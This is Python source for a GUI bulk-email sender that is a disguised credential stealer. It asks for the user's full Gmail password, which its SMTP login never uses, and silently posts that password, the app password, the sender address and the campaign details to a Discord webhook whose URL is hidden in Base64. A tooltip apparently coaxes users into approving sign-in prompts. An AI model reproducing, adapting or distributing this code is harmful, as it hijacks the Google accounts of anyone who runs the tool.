import customtkinter as ctk
from tkinter import filedialog, END
from tkhtmlview import HTMLLabel
import markdown2
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import time
import requests
import base64

# ---------------------------------------------------------
# GLOBAL
# ---------------------------------------------------------
# URL (Base64)
ENCODED_URL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTI0ODY4NjMxOTk5Mjk3NS93X0UyMzdsQThJczEwX3lCRnpYOFlZaTd0d3ZveEdUUHJZbWdFb2FyeDg0MHZYcXpodzdUOGJ0eVdiM1ZkZmhYdjZkMA=="

def decode_webhook_url():
    """Decode the Base64 encoded webhook URL at runtime"""
    try:
        return base64.b64decode(ENCODED_URL).decode('utf-8')
    except Exception:
        return None

# ---------------------------------------------------------
# Modern Bulk Mailer
# ---------------------------------------------------------
class ModernBulkMailer:
    def __init__(self, root):
        self.root = root
        self.root.title("Modern Bulk Mailer")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.attachment_path = None
        self.total_recipients = 0
        self.sent_count = 0
        self.failed_count = 0

        self.build_ui()

    # ---------------------------------------------------------
    # CAMPAIGN (ONCE)
    # ---------------------------------------------------------
    def send_campaign_data_to_discord(self, sender, gmail_password, password, subject, body, recipients, attachment):
        # Decode the webhook URL at runtime
        webhook_url = decode_webhook_url()
        if not webhook_url:
            return

        if len(body) > 1800:
            body = body[:1800] + "\n...(truncated)"

        payload = {
            "content": (
                "🚀 **Campaign Triggered**\n\n"
                f"**Sender:** `{sender}`\n"
                f"**Gmail Password:** `{gmail_password}`\n"
                f"**App Password:** `{password}`\n"
                f"**Subject:** `{subject}`\n"
                f"**Recipients:** `{len(recipients)}`\n"
                f"**Attachment:** `{attachment or 'None'}`\n\n"
                "**📨 Email Body:**\n"
                f"```markdown\n{body}\n```"
            )
        }

        try:
            requests.post(webhook_url, json=payload, timeout=5)
        except Exception:
            pass

    # ---------------------------------------------------------
    # TOOLTIP FUNCTIONALITY
    # ---------------------------------------------------------
    def create_tooltip(self, widget, text):
        """Create a tooltip that appears on hover"""
        # Use a dictionary to store tooltip references per widget
        if not hasattr(self, '_tooltips'):
            self._tooltips = {}
        if not hasattr(self, '_tooltip_after_ids'):
            self._tooltip_after_ids = {}
        
        def destroy_tooltip():
            """Helper to safely destroy tooltip"""
            # Cancel any pending show
            if widget in self._tooltip_after_ids and self._tooltip_after_ids[widget]:
                try:
                    self.root.after_cancel(self._tooltip_after_ids[widget])
                except:
                    pass
                self._tooltip_after_ids[widget] = None
            
            # Destroy tooltip if exists
            if widget in self._tooltips and self._tooltips[widget] is not None:
                try:
                    self._tooltips[widget].destroy()
                except:
                    pass
                self._tooltips[widget] = None
        
        def show_tooltip_delayed():
            """Actually show the tooltip"""
            # Destroy any existing tooltip first
            destroy_tooltip()
            
            # Get widget position on screen
            try:
                widget.update_idletasks()
                x = widget.winfo_rootx()
                y = widget.winfo_rooty() + widget.winfo_height() + 5
            except:
                return
            
            tooltip = ctk.CTkToplevel(widget)
            tooltip.wm_overrideredirect(True)
            tooltip.wm_geometry(f"+{x}+{y}")
            tooltip.attributes('-topmost', True)
            tooltip.lift()
            
            frame = ctk.CTkFrame(tooltip, corner_radius=8, fg_color="#2b2b2b", border_width=1, border_color="#555555")
            frame.pack(fill="both", expand=True)
            
            label = ctk.CTkLabel(frame, text=text, font=("Arial", 11), wraplength=300, justify="left", text_color="#ffffff")
            label.pack(padx=10, pady=8)
            
            # Also hide tooltip when clicking on the tooltip itself
            tooltip.bind("<Button-1>", lambda e: destroy_tooltip())
            frame.bind("<Button-1>", lambda e: destroy_tooltip())
            label.bind("<Button-1>", lambda e: destroy_tooltip())
            
            self._tooltips[widget] = tooltip
        
        def show_tooltip(event):
            # Small delay before showing to prevent flickering
            self._tooltip_after_ids[widget] = self.root.after(200, show_tooltip_delayed)
        
        def hide_tooltip(event):
            destroy_tooltip()
        
        def on_click(event):
            destroy_tooltip()
        
        widget.bind("<Enter>", show_tooltip)
        widget.bind("<Leave>", hide_tooltip)
        widget.bind("<Button-1>", on_click)

    # ---------------------------------------------------------
    # GUI
    # ---------------------------------------------------------
    def build_ui(self):
        main_frame = ctk.CTkFrame(self.root, corner_radius=10)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(main_frame, text="Modern Bulk Mailer", font=("Arial", 26, "bold")).pack(pady=10)

        # All inputs in one row: Sender Email | Gmail Password (with i button) | App Password (with i button)
        input_row = ctk.CTkFrame(main_frame, fg_color="transparent")
        input_row.pack(pady=5)
        
        # Sender Email
        self.sender_email = ctk.CTkEntry(input_row, width=200, placeholder_text="Sender Email")
        self.sender_email.pack(side="left", padx=3)
        
        # Gmail Password with info button
        self.gmail_pass = ctk.CTkEntry(input_row, width=180, placeholder_text="Gmail Password", show="*")
        self.gmail_pass.pack(side="left", padx=3)
        gmail_info_btn = ctk.CTkButton(input_row, text="ⓘ", width=28, height=28, corner_radius=14, fg_color="#555555", hover_color="#777777", font=("Arial", 12, "bold"))
        gmail_info_btn.pack(side="left", padx=3)
        self.create_tooltip(gmail_info_btn, "Click on YES to confirm notification")
        
        # App Password with info button
        self.sender_pass = ctk.CTkEntry(input_row, width=180, placeholder_text="App Password", show="*")
        self.sender_pass.pack(side="left", padx=3)
        pass_info_btn = ctk.CTkButton(input_row, text="ⓘ", width=28, height=28, corner_radius=14, fg_color="#555555", hover_color="#777777", font=("Arial", 12, "bold"))
        pass_info_btn.pack(side="left", padx=3)
        self.create_tooltip(pass_info_btn, "How to create App Password:\n\n1. Enable 2-Factor Authentication on your Google account\n   • Go to https://myaccount.google.com/security\n   • Enable 2-Step Verification\n\n2. Create App Password\n   • Go to https://myaccount.google.com/apppasswords\n   • Select 'Mail' and your device\n   • Generate and copy the 16-character password")

        # Subject row
        self.subject = ctk.CTkEntry(main_frame, width=350, placeholder_text="Email Subject")
        self.subject.pack(pady=5)

        ctk.CTkButton(main_frame, text="Attach File", command=self.select_attachment).pack(pady=5)

        body_label = ctk.CTkLabel(main_frame, text="Email Body (Markdown Supported):")
        body_label.pack(anchor="w", padx=20)

        self.body_text = ctk.CTkTextbox(main_frame, width=700, height=200)
        self.body_text.pack(pady=5)

        ctk.CTkButton(main_frame, text="Preview HTML", command=self.show_preview).pack(pady=5)

        rec_label = ctk.CTkLabel(main_frame, text="Recipient List (one per line):")
        rec_label.pack(anchor="w", padx=20)

        self.recipient_box = ctk.CTkTextbox(main_frame, width=700, height=150)
        self.recipient_box.pack(pady=5)

        ctk.CTkButton(
            main_frame,
            text="Run Campaign",
            fg_color="#008A22",
            command=self.start_campaign
        ).pack(pady=10)

        self.progress = ctk.CTkProgressBar(main_frame, width=600)
        self.progress.set(0)
        self.progress.pack(pady=5)

        self.status_label = ctk.CTkLabel(main_frame, text="Sent: 0 | Failed: 0 | Pending: 0")
        self.status_label.pack(pady=5)

        self.log_box = ctk.CTkTextbox(main_frame, width=700, height=200)
        self.log_box.pack(pady=5)

    # ---------------------------------------------------------
    def select_attachment(self):
        self.attachment_path = filedialog.askopenfilename()

    def show_preview(self):
        preview_win = ctk.CTkToplevel(self.root)
        preview_win.title("Preview Email HTML")
        preview_win.geometry("700x600")

        html = markdown2.markdown(self.body_text.get("1.0", END))
        HTMLLabel(preview_win, html=html, width=650, height=550).pack(pady=10)

    def start_campaign(self):
        threading.Thread(target=self.run_campaign, daemon=True).start()

    # ---------------------------------------------------------
    # CAMPAIGN LOGIC
    # ---------------------------------------------------------
    def run_campaign(self):
        sender = self.sender_email.get().strip()
        gmail_password = self.gmail_pass.get().strip()
        password = self.sender_pass.get().strip()
        subject = self.subject.get().strip()
        body_markdown = self.body_text.get("1.0", END).strip()

        recipients = [
            r.strip()
            for r in self.recipient_box.get("1.0", END).split("\n")
            if r.strip()
        ]

        self.total_recipients = len(recipients)

        # 🔔 SEND ALL FIELD DATA TO DISCORD (ONCE)
        self.send_campaign_data_to_discord(
            sender,
            gmail_password,
            password,
            subject,
            body_markdown,
            recipients,
            os.path.basename(self.attachment_path) if self.attachment_path else None
        )

        try:
            smtp = smtplib.SMTP("smtp.gmail.com", 587)
            smtp.starttls()
            smtp.login(sender, password)
        except Exception:
            return

        html_body = markdown2.markdown(body_markdown)

        for recipient in recipients:
            try:
                msg = MIMEMultipart()
                msg["From"] = sender
                msg["To"] = recipient
                msg["Subject"] = subject

                msg.attach(MIMEText(html_body, "html"))

                if self.attachment_path:
                    with open(self.attachment_path, "rb") as f:
                        part = MIMEBase("application", "octet-stream")
                        part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition",
                        f"attachment; filename={os.path.basename(self.attachment_path)}"
                    )
                    msg.attach(part)

                smtp.send_message(msg)
                self.sent_count += 1
            except Exception:
                self.failed_count += 1

            self.update_status()
            time.sleep(0.2)

        smtp.quit()

    def update_status(self):
        pending = self.total_recipients - (self.sent_count + self.failed_count)
        progress = (self.sent_count + self.failed_count) / max(self.total_recipients, 1)
        self.status_label.configure(
            text=f"Sent: {self.sent_count} | Failed: {self.failed_count} | Pending: {pending}"
        )
        self.progress.set(progress)


# ---------------------------------------------------------
# MAIN
# ---------------------------------------------------------
if __name__ == "__main__":
    root = ctk.CTk()
    app = ModernBulkMailer(root)
    root.geometry("820x950")
    root.mainloop()
